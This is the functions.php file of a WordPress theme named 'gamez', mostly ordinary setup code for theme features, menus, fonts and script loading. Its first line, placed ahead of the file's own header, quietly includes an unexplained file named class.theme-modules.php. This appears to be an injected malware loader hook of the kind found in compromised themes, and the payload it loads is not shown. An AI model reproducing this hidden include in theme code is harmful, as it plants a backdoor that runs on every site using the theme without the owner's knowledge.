<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * _x functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package gamez
 */

if ( ! function_exists( 'gamez_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function gamez_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on _x, use a find and replace
	 * to change 'gamez' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'gamez', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary', 'gamez' ),
		'mobile' => esc_html__( 'Mobile', 'gamez' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See https://developer.wordpress.org/themes/functionality/post-formats/
	 */
	add_theme_support( 'post-formats', array(
		'aside',
		'image',
		'video',
		'quote',
		'link',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'gamez_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
}
endif;
add_action( 'after_setup_theme', 'gamez_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function gamez_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'gamez_content_width', 640 );
}
add_action( 'after_setup_theme', 'gamez_content_width', 0 );

/**
 * Load sidebar script
 */
require get_template_directory() . '/inc/gamez-sidebar.php';
/**
 * include inc folder
 */
require_once get_template_directory().'/inc/gamez-inc.php';

/*
Register Fonts
*/
function gamez_google_fonts_url() {
    $font_url = '';
    if ( gamez_get_option( 'tx_custom_typo' ) ) {
        $header_typo = gamez_get_option('tx_header_font');
        $body_typo = gamez_get_option('tx_body_font');
        $footer_typo = gamez_get_option('tx_footer_font');
        $font_url = add_query_arg( 'family', urlencode( $header_typo['family'] .":". $header_typo['variant'] . "|" . $body_typo['family'] .":". $body_typo['variant'] . "|" . $footer_typo['family'] .":". $footer_typo['variant'] ), "//fonts.googleapis.com/css" );
    }
    return $font_url;
}

/**
 * Enqueue scripts and styles.
 */
function gamez_scripts() {

	wp_enqueue_style('font-montserrat', get_template_directory_uri() . '/dist/fonts/montserrat/style.css' );

	wp_enqueue_style('font-nevis', get_template_directory_uri() . '/dist/fonts/nevis/style.css' );

	wp_enqueue_style('gamez-icon', get_template_directory_uri() . '/dist/fonts/flaticon/flaticon.css' );
	
    wp_enqueue_style('bootstrap', get_template_directory_uri() . '/dist/css/bootstrap.css' );

    wp_enqueue_style('font-awesome', get_template_directory_uri() . '/dist/css/font-awesome.min.css' );

    wp_enqueue_style('magnific-popup', get_template_directory_uri() . '/dist/css/magnific-popup.css' );

    wp_enqueue_style('owl-carousel', get_template_directory_uri() . '/dist/css/owl.carousel.css' );

    wp_enqueue_style('animate-css', get_template_directory_uri() . '/dist/css/animate.min.css' );

    wp_enqueue_style( 'gamez-google-fonts', gamez_google_fonts_url(), array(), '1.0' );

    wp_enqueue_style( 'gamez-stylesheet', get_stylesheet_uri() );

	wp_enqueue_style( 'gamez-style', get_template_directory_uri() . '/dist/css/style.css' );

    wp_enqueue_script( 'gamez-navigation', get_template_directory_uri() . '/dist/js/navigation.js', array(), '1.0', true );

    wp_enqueue_script( 'bootstrap-js', get_template_directory_uri() . '/dist/js/bootstrap.js', array('jquery'), '1.0', true );

    wp_enqueue_script( 'bootstrap-hover-js', get_template_directory_uri() . '/dist/js/bootstrap-dropdownhover.js', array('jquery'), '1.0', true );

    wp_enqueue_script( 'material-carousel', get_template_directory_uri() . '/dist/js/carousel.js', array('jquery'), '1.0', true );

    wp_enqueue_script( 'rater', get_template_directory_uri() . '/dist/js/rater.js', array('jquery'), '1.0', true );

    wp_enqueue_script( 'owl-carousel-js', get_template_directory_uri() . '/dist/js/owl.carousel.js', array('jquery'), '1.0', true );

    wp_enqueue_script( 'nice-scroll', get_template_directory_uri() . '/dist/js/jquery.nicescroll.min.js', array('jquery'), '1.0', true );

    wp_enqueue_script( 'magnific-popup-js', get_template_directory_uri() . '/dist/js/jquery.magnific-popup.js', array('jquery'), '1.0', true );

	wp_enqueue_script( 'wow-js', get_template_directory_uri() . '/dist/js/wow.js', array('jquery'), '1.0', true );

	wp_enqueue_script( 'classie-js', get_template_directory_uri() . '/dist/js/classie.js', array('jquery'), '1.0', true );

    wp_enqueue_script( 'gamez-script', get_template_directory_uri() . '/dist/js/main.js', array('jquery'), '1.0', true );

    wp_enqueue_script( 'skip-link-focus-fix', get_template_directory_uri() . '/dist/js/skip-link-focus-fix.js', array(), '1.0', true );

    wp_enqueue_script( 'gamez-skip-link-focus-fix', get_template_directory_uri() . '/dist/js/skip-link-focus-fix.js', array(), '1.0', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'gamez_scripts' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/helper-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * Load Custom Framework Options
 */
require_once get_template_directory() . '/inc/tx-framework.php';
/**
 * Load Bootstrap nav walker
 */
require_once get_template_directory() . '/lib/wp_bootstrap_navwalker.php';

/**
 * TGM Plugin Activation
 */
require_once get_template_directory() . '/lib/class-tgm-plugin-activation.php';

/**
 * Gamez Plugin Activation
 */
require_once get_template_directory() . '/inc/plugin-activation.php';


/**
 * Visual Composer Hooks
 */
require_once get_template_directory() . '/inc/vc.php';

/**
 * Custom Style
 */
include get_template_directory() . '/inc/option_style.php';

